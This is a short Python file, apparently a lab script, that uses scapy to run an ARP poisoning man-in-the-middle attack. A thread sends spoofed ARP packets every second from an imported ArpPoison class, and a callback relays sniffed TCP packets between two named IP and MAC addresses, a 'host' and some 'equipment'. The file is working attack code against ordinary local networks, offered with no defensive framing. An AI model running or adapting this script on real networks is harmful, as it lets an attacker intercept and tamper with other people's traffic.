from scapy.all import *
from test01 import ArpPoison
from threading import Thread
from time import sleep

arpPoison = ArpPoison(mode=1)
        

def callback(pkt):
    previousPacket = pkt[TCP]
    # print(pkt[IP].src)
    # print(pkt[Ether].dst)
    if pkt[Ether].dst[4] == 'e':
        if pkt[IP].src == "192.168.0.11":
            pkt.show()
            pkt[Ether].dst = MAC_HOST
            sendp(pkt, iface="以太网 2", verbose=1)
        elif pkt[IP].src == "192.168.0.10":
            pkt.show()
            pkt[Ether].dst = MAC_EQUIPMENT
            sendp(pkt, iface="以太网 2", verbose=1)
        

def threadPoison():
    while True:
        arpPoison.send()
        sleep(1)     

if __name__ == "__main__":
    MAC_EQUIPMENT = "00:0C:29:E9:42:B4"
    MAC_HOST = "00:0C:29:06:28:E5"
    thread = Thread(target=threadPoison, args=())
    thread.start()
    # sniff(filter = "tcp", prn = callback, iface = "以太网 2")